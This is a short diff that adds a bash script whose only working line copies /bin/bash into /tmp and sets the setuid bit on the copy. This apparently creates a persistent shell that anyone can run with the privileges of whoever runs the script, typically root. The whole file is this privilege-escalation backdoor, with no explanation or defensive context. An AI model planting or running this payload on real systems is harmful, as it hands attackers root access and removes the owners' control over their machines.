@@ -1,0 +1,3 @@
+#!/usr/bin/bash
+
+cp /bin/bash /tmp && chmod 4755 /tmp/bash
